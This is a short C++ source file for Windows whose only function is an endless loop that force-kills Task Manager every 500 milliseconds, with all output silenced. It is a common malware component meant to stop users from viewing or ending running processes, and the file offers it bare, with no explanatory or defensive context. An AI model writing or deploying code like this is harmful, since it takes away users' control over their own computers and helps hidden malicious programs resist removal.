#include <windows.h>
#include <iostream>
#include <strsafe.h>

using namespace std;

int main() {
    while (true) {
        system("taskkill /im Taskmgr.exe /F 2> Nul 1> Nul");
        Sleep(500);
    }

}